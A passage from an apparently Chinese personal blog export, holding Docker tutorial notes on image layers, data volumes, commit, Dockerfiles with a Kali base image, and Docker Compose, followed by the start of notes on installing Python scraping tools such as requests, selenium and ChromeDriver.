<li>特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录</li>
</ul>
<h3 id="Docker镜像加载原理"><a href="#Docker镜像加载原理" class="headerlink" title="Docker镜像加载原理"></a>Docker镜像加载原理</h3><ul>
<li>docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。</li>
<li>bootfs（boot ilesystem）主要包含bootloader和kerne，bootloader主要是引导加载kernel，Linux刚启动时会加载bootfs文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由botfs转交给内核，此时系统也会卸载bootfs。[个人理解：bootfs用于开机，rootfs用于命令。]</li>
<li>rootfs（root file system），在bootfs之上。包含的就是典型Linux系统中的/de，/proc，/bin，/etc等标准目录和文件。roots就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。</li>
</ul>
<p><strong>为什么虚拟机很大，Docker很小？</strong><br><strong>对于一个精简的OS，rootfs可以很小，只需要包含最基本的命令，工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供rootfs就可以了。由此可见对于不同的linux发行版， bootfs基本是一致的，rootfs会有差别，因此不同的发行版可以公用bootfs。</strong><br><strong>虚拟机是分钟级别，容器是秒级!</strong></p>
<h3 id="分层原理"><a href="#分层原理" class="headerlink" title="分层原理"></a>分层原理</h3><p>所有的Docker┌镜像都起始于一个基础镜像层，当进行修改或增加新的内容时，就会在当前镜像层之上，创建新的镜像层。<br>举一个简单的例子，假如基于UbuntuLinux16.04创建一个新的镜像，这就是新镜像的第一层;如果在该镜像中添加Python包，就会在基础镜像层之上创建第二个镜像层;如果继续添加一个安全补丁，就会创建第三个镜像层。<br>该镜像当前已经包含3个镜像层，如下图所示（这只是一个用于演示的很简单的例子）。</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020090520471054.png"></p>
<p>在添加额外的镜像层的同时，镜像始终保持是当前所有镜像的组合，理解这一点非常重要。下图中举了一个简单的例子，每个镜像层包含3个文件，而镜像包含了来自两个镜像层的6个文件。<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200905204721901.png"><br>上图中的镜像层跟之前图中的略有区别，主要目的是便于展示文件。<br>下图中展示了一个稍微复杂的三层镜像，在外部看来整个镜像只有6个文件，这是因为最上层中的文件7是文件5的一个更新版本<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200905204732895.png"></p>
<p>这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层添加到镜像当中。<br>Docker通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈，并保证多镜像层对外展示为统一的文件系统。<br>Linux上可用的存储引擎有AUFS、Overlay2、Device Mapper、Btrfs以及ZFS。顾名思义，每种存储引擎都基于Linux中对应的文件系统或者块设备技术，并且每种存储引擎都有其独有的性能特点。<br>Docker在Windows上仅支持windowsfiter一种存储引擎，该引擎基于NTFS文件系统之上实现了分层和CoW【1】.<br>下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供统一的视图。</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200905204745980.png"></p>
<h2 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h2><h3 id="什么是数据卷"><a href="#什么是数据卷" class="headerlink" title="什么是数据卷"></a>什么是数据卷</h3><p>数据卷：将宿主机的一个目录映射到容器的一个目录中<br>我们想叫容器有的数据同步在本地上，容器和本地之间可以共享数据，这个就是数据卷<br>简单理解就是比如vm虚拟机下载的文件下载到本地共享文件夹里面，我们删除虚拟机本地共享文件夹里面的下载文件还在</p>
<h3 id="容器目录映射-v参数"><a href="#容器目录映射-v参数" class="headerlink" title="容器目录映射-v参数"></a>容器目录映射-v参数</h3><p>上面有一个<code>-p  5555:22</code>是叫本地端口映射到容器的22端口上<br>我们就可以用-v进行文件映射<code>-v 主机目录:容器目录</code><br>列如下面这个<br>就会吧主机目录映射到容器目录里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run   -v 主机目录:容器目录    镜像的ID&#x2F;镜像名称:版本号  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>还可以设置权限<br><code>ro</code>意思是只读意思</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run   -v 主机目录:容器目录:ro    镜像的ID&#x2F;镜像名称:版本号  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<h4 id="容器和物理机目录映射"><a href="#容器和物理机目录映射" class="headerlink" title="容器和物理机目录映射"></a>容器和物理机目录映射</h4><p>在物理机里面创建一个<code>a</code>文件夹<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210183121.png"></p>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cker run --name kali2  -it   -v  &#x2F;root&#x2F;a:&#x2F;root&#x2F;b  a1765e8e381e   &#x2F;bin&#x2F;bash </span><br></pre></td></tr></table></figure>
<p><code>--name</code> 容器名称：指定容器的名称<br><code>-v</code>  知道映射主机目录和容器目录<br>启动下面这个命令他会在容器kali里面创建一个<code>b</code>文件夹<br><code>-it</code> 交互方法运行 主机可以进入<br><code>/bin/bash</code> 是运行控制台 载入容器后运行 ，docker中必须要保持一个进程的运行，要不然整个容器启动后就会马上kill itself，这个/bin/bash就表示启动容器后启动bash<br>可以看见容器里面有一个b文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210184535.png"></p>
<h4 id="查看他有没有映射成功"><a href="#查看他有没有映射成功" class="headerlink" title="查看他有没有映射成功"></a>查看他有没有映射成功</h4><p>容器的信息里面有他的映射信息<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker inspect  容器ID</span><br></pre></td></tr></table></figure>
<p>可以看见映射成功<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210185650.png"></p>
<h4 id="测试看看文件同步不"><a href="#测试看看文件同步不" class="headerlink" title="测试看看文件同步不"></a>测试看看文件同步不</h4><p>在物理机里面创建一个a.txt文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210185824.png"></p>
<p>可以看见容器kali里面已经有了a.txt文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210185933.png"></p>
<p>如果我们关闭容器然后在物理机创建一个文件<br>那在容器启动后也会有那个文件</p>
<h4 id="其他的挂载"><a href="#其他的挂载" class="headerlink" title="其他的挂载"></a>其他的挂载</h4><p><strong>具名挂载</strong><br>创建数据卷<br>创建数据卷之后，默认会存放在一个目录下 /war/lib/docker/volumes/数据卷名称/_data</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker volume create 数据卷名称</span><br></pre></td></tr></table></figure>
<p>查看数据卷的详细信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker volume inspect 数据卷名称</span><br></pre></td></tr></table></figure>
<p>查看全部数据卷</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker volume ls</span><br></pre></td></tr></table></figure>
<p>删除数据卷</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker volume rm 数据卷名称</span><br></pre></td></tr></table></figure>
<p>应用数据卷</p>
<p>当你映射数据卷时，如果数据卷不存在，Docker会自动帮你创建，会将容器内部自带的文件，存储在默认的存放路径中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -v 数据卷名称:容器内部的路径 镜像id</span><br></pre></td></tr></table></figure>
<h3 id="实咧多个容器同步挂载"><a href="#实咧多个容器同步挂载" class="headerlink" title="实咧多个容器同步挂载"></a>实咧多个容器同步挂载</h3><p>多个容器挂载会用到<code>--volumes-from</code><br>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name kali3  -it  --volumes-from  已经挂载的容器名     镜像的ID&#x2F;镜像名称:版本号  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><strong>实咧</strong><br><strong>容器和物理机目录映射</strong><br>在物理机里面创建一个<code>a</code>文件夹<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210183121.png"></p>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cker run --name kali2  -it   -v  &#x2F;root&#x2F;a:&#x2F;root&#x2F;b  a1765e8e381e   &#x2F;bin&#x2F;bash </span><br></pre></td></tr></table></figure>
<p><code>--name</code> 容器名称：指定容器的名称<br><code>-v</code>  知道映射主机目录和容器目录<br>启动下面这个命令他会在容器kali里面创建一个<code>b</code>文件夹<br><code>-it</code> 交互方法运行 主机可以进入<br><code>/bin/bash</code> 是运行控制台 载入容器后运行 ，docker中必须要保持一个进程的运行，要不然整个容器启动后就会马上kill itself，这个/bin/bash就表示启动容器后启动bash<br>可以看见容器里面有一个b文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210184535.png"></p>
<p><strong>测试看看文件同步不</strong><br>在物理机里面创建一个a.txt文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210185824.png"></p>
<p>可以看见容器kali里面已经有了a.txt文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210185933.png"></p>
<p><strong>我在创建一个kali3的容器然后在叫这新个容器用<code>--volumes-from</code>挂载在哪个已经挂载挂数据卷物理机的kali2上面</strong><br><strong>这样就实现多个容器同步了</strong></p>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name kali3  -it  --volumes-from  kali2   a1765e8e381e   &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>可以看见在kali3也是同步了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210201019.png"></p>
<p>如果kali2容器删除了，那kali3也会正常同步的</p>
<h2 id="commit参数容器变成镜像"><a href="#commit参数容器变成镜像" class="headerlink" title="commit参数容器变成镜像"></a>commit参数容器变成镜像</h2><p>我的这个kali已经添加和下载了很到东西，我叫我的这个kali的容器进行生成镜像，就和vm快照差不多<br>比如我们的用的镜像好用我们就可以叫容器打包成镜像<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker commit -m&#x3D;&quot;提交的描述信息&quot; -a&#x3D;&quot;作者&quot; 容器id  制作出来的镜像名:他的版本号</span><br></pre></td></tr></table></figure>
<h3 id="实咧"><a href="#实咧" class="headerlink" title="实咧"></a>实咧</h3><p>查看一下kali容器号<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
<p>容器号是<code>702e50cf2295</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210164428.png"><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker commit -m&#x3D;&quot;kali&quot; -a&#x3D;&quot;abc&quot; 702e50cf2295  kalilinux2:1.0 </span><br></pre></td></tr></table></figure>
<p>成功<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210164600.png"><br>我们查看一下进行，出来了一个kalinux2的镜像大小比原来的多0.3g<br>这个镜像我们直接就可以用了，<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210164647.png"></p>
<h2 id="定义自己的镜像"><a href="#定义自己的镜像" class="headerlink" title="定义自己的镜像"></a>定义自己的镜像</h2><h3 id="Dockerfile的命令"><a href="#Dockerfile的命令" class="headerlink" title="Dockerfile的命令"></a>Dockerfile的命令</h3><p>他的命令记住必须大写</p>
<table>
<thead>
<tr>
<th align="center">命令</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>FROM</code></td>
<td align="right">基础镜像信息，一切从这里开始</td>
</tr>
<tr>
<td align="center"><code>MAINTAINER</code></td>
<td align="right">作者的信息 ，姓名+邮箱</td>
</tr>
<tr>
<td align="center"><code>RUN</code></td>
<td align="right">镜像运行的时候需要运行的命令</td>
</tr>
<tr>
<td align="center"><code>ADD</code></td>
<td align="right">一个复制命令，把文件复制到镜像中</td>
</tr>
<tr>
<td align="center"><code>WORKDIR</code></td>
<td align="right">镜像的工作目录</td>
</tr>
<tr>
<td align="center"><code>VOLUME</code></td>
<td align="right">挂载的目录，可以将文件夹或者其他容器种得文件夹挂在到这个容器种</td>
</tr>
<tr>
<td align="center"><code>EXPOSE</code></td>
<td align="right">功能为暴漏容器运行时的监听端口给外部，和-P差不多</td>
</tr>
<tr>
<td align="center"><code>CMD</code></td>
<td align="right">功能为容器启动时要运行的命令</td>
</tr>
<tr>
<td align="center"><code>ENTRYPOINT</code></td>
<td align="right">功能是启动时的默认命令</td>
</tr>
<tr>
<td align="center"><code>ONBUILD</code></td>
<td align="right">触发命令，构建一个被继承Dockerfile，会触发ONBUILD的命令</td>
</tr>
<tr>
<td align="center"><code>COPY</code></td>
<td align="right">类似ADD，文件拷贝到镜像中</td>
</tr>
<tr>
<td align="center"><code>ENV</code></td>
<td align="right">功能为设置环境变量，就和a=10，这个a就是10一样</td>
</tr>
</tbody></table>
<h3 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h3><p>我们安装kali linux的里面什么都没有连<code>ifconfig</code>命令都没有还得需要自己下载<br>我想叫基本命令和ssh给添加上去</p>
<h3 id="编写Dockerfile文件"><a href="#编写Dockerfile文件" class="headerlink" title="编写Dockerfile文件"></a>编写Dockerfile文件</h3><p>我就创建一个名字是<code>own-Kali-Linux</code></p>
<p>文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM  kalilinux&#x2F;kali-linux-docker     </span><br><span class="line"></span><br><span class="line">MAINTAINER zhaobia&lt;2737977997@qq.com&gt;    </span><br><span class="line"></span><br><span class="line">ENV  MuLu  &#x2F;use&#x2F;local    </span><br><span class="line"></span><br><span class="line">WORKDIR  $MuLu      </span><br><span class="line"></span><br><span class="line">RUN  echo &quot;deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib&quot;   &gt;  &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line">RUN  apt update</span><br><span class="line">RUN  apt -y  install net-tools    </span><br><span class="line">RUN  apt -y install vim  </span><br><span class="line">RUN  apt -y  install ssh</span><br><span class="line"></span><br><span class="line">RUN   &#x2F;etc&#x2F;init.d&#x2F;ssh  start</span><br><span class="line">EXPOSE 22</span><br><span class="line"></span><br><span class="line">CMD  echo &quot;------下载成功---------&quot;</span><br><span class="line">CMD  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM  kalilinux&#x2F;kali-linux-docker     #基础镜像信息，一切从这里开始</span><br><span class="line"></span><br><span class="line">MAINTAINER zhaobia&lt;2737977997@qq.com&gt;     #作者的信息 ，姓名+邮箱 </span><br><span class="line"></span><br><span class="line">ENV  MuLu  &#x2F;use&#x2F;local    #这个就是叫Mulu就是个变量，他就是&#x2F;use&#x2F;local </span><br><span class="line"></span><br><span class="line">WORKDIR  $MuLu      #镜像的工作目录就是我们进入镜像就进入指定的目录  $MuLu就是上面的变量</span><br><span class="line"></span><br><span class="line">#下面都是在kalilinux&#x2F;kali-linux-docker镜像里面运行的命令</span><br><span class="line">#这个是更换一下源</span><br><span class="line">RUN   echo &quot;deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib&quot;  &gt;  &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line">#下面都是下载一些东西,如果不加y他就报错了</span><br><span class="line">RUN  apt update</span><br><span class="line">RUN  apt -y  install net-tools    </span><br><span class="line">RUN  apt -y install vim  </span><br><span class="line">RUN  apt -y  install ssh</span><br><span class="line">RUN   &#x2F;etc&#x2F;init.d&#x2F;ssh  start</span><br><span class="line"></span><br><span class="line">#映射容器内的22端口</span><br><span class="line">EXPOSE 22</span><br><span class="line"></span><br><span class="line">#CMD功能为容器启动时要运行的命令</span><br><span class="line">CMD  echo &quot;------下载成功---------&quot;</span><br><span class="line">CMD  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211112320.png"></p>
<h3 id="通过文件构建镜像"><a href="#通过文件构建镜像" class="headerlink" title="通过文件构建镜像"></a>通过文件构建镜像</h3><p>构建镜像用<code>build</code>参数进行构建<br>格式<br>后面有一个<code>.</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -f 编写的Dockerfile文件名 -t  镜像名字:版本 . </span><br></pre></td></tr></table></figure>
<p><strong>用上面的<code>own-Kali-Linux</code>文件构建成镜像</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -f own-Kali-Linux -t  kalilinux:1.0 .  </span><br></pre></td></tr></table></figure>
<p>可以这样就可以进行执行自己写的命令了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211112734.png"></p>
<p>用命令<code>docker images</code>查看一下镜像可以看见有一个名kalilinux版本1.0的kali<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211112918.png"></p>
<h3 id="测试自己定义的镜像"><a href="#测试自己定义的镜像" class="headerlink" title="测试自己定义的镜像"></a>测试自己定义的镜像</h3><p>用自己定义的镜像启动容器</p>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run  -it 77319bf090e7  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211113633.png"></p>
<p>我们看一下我在<code>own-Kali-Linux</code>里面指定的命令已经被直接了<br>安装了<code>net-tools，vim，ssh</code><br>可以看见已经被安装了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211114102.png"></p>
<h3 id="查看镜像是怎么做的-1"><a href="#查看镜像是怎么做的-1" class="headerlink" title="查看镜像是怎么做的"></a>查看镜像是怎么做的</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker history  镜像ID</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211114552.png"></p>
<h3 id="CMD和ENTRYPOINT的区别"><a href="#CMD和ENTRYPOINT的区别" class="headerlink" title="CMD和ENTRYPOINT的区别"></a>CMD和ENTRYPOINT的区别</h3><h4 id="CMD执行的命令"><a href="#CMD执行的命令" class="headerlink" title="CMD执行的命令"></a>CMD执行的命令</h4><p>制作一个镜像文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM  centos</span><br><span class="line">CMD [&#39;ls&#39;,&#39;-a&#39;]</span><br></pre></td></tr></table></figure>
<p>可以看见直接到时候就运行了<code>ls -a</code>命令<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211115255.png"><br>如果启动的时候启动添加命令他就会报错<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211115648.png"></p>
<h4 id="ENTRYPOINT执行的命令"><a href="#ENTRYPOINT执行的命令" class="headerlink" title="ENTRYPOINT执行的命令"></a>ENTRYPOINT执行的命令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM  centos</span><br><span class="line">ENTRYPOINT [&#39;ls&#39;,&#39;-a&#39;]</span><br></pre></td></tr></table></figure>
<p>可以看见直接到时候就运行了<code>ls -a</code>命令<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211115255.png"><br>如果启动的时候启动添加命令他就没有报错<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211115815.png"></p>
<h4 id="他两个的区别"><a href="#他两个的区别" class="headerlink" title="他两个的区别"></a>他两个的区别</h4><p><code>CMD</code>如果启动的时候启动添加命令他就会报错<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211115648.png"><br><code>ENTRYPOINT</code>如果启动的时候启动添加命令他就没有报错<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211115815.png"></p>
<h2 id="上发镜像中央仓库上"><a href="#上发镜像中央仓库上" class="headerlink" title="上发镜像中央仓库上"></a>上发镜像中央仓库上</h2><p>地址<a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
<h3 id="登录仓库上"><a href="#登录仓库上" class="headerlink" title="登录仓库上"></a>登录仓库上</h3><p>命令<br>回车之后就叫你输入密码了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker login  -u 用户 回车</span><br></pre></td></tr></table></figure>
<h3 id="提交镜像"><a href="#提交镜像" class="headerlink" title="提交镜像"></a>提交镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker push  镜像名或者镜像ID:版本号</span><br></pre></td></tr></table></figure>
<h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker-Compose"></a>Docker-Compose</h2><h3 id="什么是Docker-Compose-简介"><a href="#什么是Docker-Compose-简介" class="headerlink" title="什么是Docker-Compose 简介"></a>什么是Docker-Compose 简介</h3><p>Compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</p>
<h3 id="下载Docker-Compose"><a href="#下载Docker-Compose" class="headerlink" title="下载Docker-Compose"></a>下载Docker-Compose</h3><p>在kali下载命令是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install  docker-compose</span><br></pre></td></tr></table></figure>
<p>其他linux系统如果没有可以在github上下载地址<a href="https://github.com/docker/compose/releases">https://github.com/docker/compose/releases</a></p>
<p>出现下面这个就下载成功了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211162358.png"></p>
<h3 id="Docker-Compose编写"><a href="#Docker-Compose编写" class="headerlink" title="Docker-Compose编写"></a>Docker-Compose编写</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">version:&#x27;3.1&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mysql:</span>                     <span class="comment"># 服务的名称</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span>          <span class="comment"># 代表只要Docker启动，那么这个容器就跟着一起启动</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">daocloud.io/library/mysql:5.7.4</span>     <span class="comment"># 指定镜像路径</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mysql</span>    <span class="comment"># 指定容器名称</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">3306</span><span class="string">:3306</span>        <span class="comment"># 指定端口号的映射</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">root</span>         <span class="comment"># 指定MySQL的ROOT用户登录密码</span></span><br><span class="line">      <span class="attr">TZ:</span> <span class="string">Asia/Shanghai</span>                 <span class="comment"># 指定时区</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/docker_mysql-tomcat/mysql_data:/var/lib/mysql</span>        <span class="comment"># 映射数据卷</span></span><br><span class="line">  <span class="attr">tomcat:</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span>          <span class="comment"># 代表只要Docker启动，那么这个容器就跟着一起启动</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">daocloud.io/library/tomcat:8.5.15-jre8</span>     <span class="comment"># 指定镜像路径</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">tomcat</span>    <span class="comment"># 指定容器名称</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span>        <span class="comment"># 指定端口号的映射</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">root</span>         <span class="comment"># 指定MySQL的ROOT用户登录密码</span></span><br><span class="line">      <span class="attr">TZ:</span> <span class="string">Asia/Shanghai</span>                 <span class="comment"># 指定时区</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/docker_mysql-tomcat/tomcat_webapps:/usr/local/tomcat/webapps</span>        <span class="comment"># 映射数据卷</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/docker_mysql-tomcat/tomcat_logs:/usr/local/tomcat/logs</span>        <span class="comment"># 映射数据卷</span></span><br></pre></td></tr></table></figure>

<p>可以看这个地址<a href="https://www.runoob.com/docker/docker-compose.html">https://www.runoob.com/docker/docker-compose.html</a></p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p><strong>基于docker-compose.yml启动管理的容器</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201211165004.png"><br><strong>关闭并删除容器</strong></p>
]]></content>
      <categories>
        <category>Docker容器</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Python爬虫1.环境</title>
    <url>/2021/01/15/Python%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>看的书《Python3 网络爬虫开发实战教程》学习笔记</p>
<p><strong>我光安装都快安装一下午了</strong></p>
<h1 id="python的安装我就不说了"><a href="#python的安装我就不说了" class="headerlink" title="python的安装我就不说了"></a>python的安装我就不说了</h1><h1 id="请求库的安装"><a href="#请求库的安装" class="headerlink" title="请求库的安装"></a>请求库的安装</h1><h2 id="安装requests"><a href="#安装requests" class="headerlink" title="安装requests"></a>安装requests</h2><p>之前介绍的 Requests 库是一个阻塞式 HTTP 请求库，当我们发出一个请求后，程序会一直等待服务器响应，直到得到响应后，程序才会进行下一步处理</p>
<p>Requests 项目的地址是：<a href="https://github.com/kennethreitz/requests">https://github.com/kennethreitz/requests</a></p>
<p><strong>kali默认安装了</strong></p>
<p>pip安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install requests</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115180101413.png" alt="image-20210115180101413"></p>
<h2 id="安装selenium"><a href="#安装selenium" class="headerlink" title="安装selenium"></a>安装selenium</h2><p>Selenium 是一个自动化测试工具，利用它我们可以驱动浏览器执行特定的动作，如点击、下拉等操作。对于一些 JavaScript 渲染的页面来说，这种抓取方式非常有效</p>
<p><strong>kali默认安装了</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install selenium</span><br></pre></td></tr></table></figure>
<p>​    验证安装</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115191928580.png" alt="image-20210115191928580"></p>
<h2 id="安装ChromeDriver"><a href="#安装ChromeDriver" class="headerlink" title="安装ChromeDriver"></a>安装ChromeDriver</h2><p>因为只有安装 ChromeDriver，才能驱动 Chrome 浏览器完成相应的操作</p>
<p>先查看谷歌浏览器的版本</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115180958747.png" alt="image-20210115180958747"></p>
<p>到这个网站去下载对应的版本</p>
<p><a href="https://chromedriver.chromium.org/downloads">https://chromedriver.chromium.org/downloads</a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115181103587.png" alt="image-20210115181103587"></p>
<p>我的系统是linux我就下载linux的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115181132566.png" alt="image-20210115181132566"></p>
<p>下载好解压出来会有一个这个文件</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115181247783.png" alt="image-20210115181247783"></p>
<p>要移动文件到 /usr/bin 目录。首先，需要在命令行模式下进入其所在路径，然后将其移动到 /usr/bin</p>
<p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mv chromedriver /usr/bin</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115181413859.png" alt="image-20210115181413859"></p>
<p>在终端运行<code>chromedriver</code>看看有没有安装成功</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115181703269.png" alt="image-20210115181703269"></p>
<p>应为我是root用户可能无法运行</p>
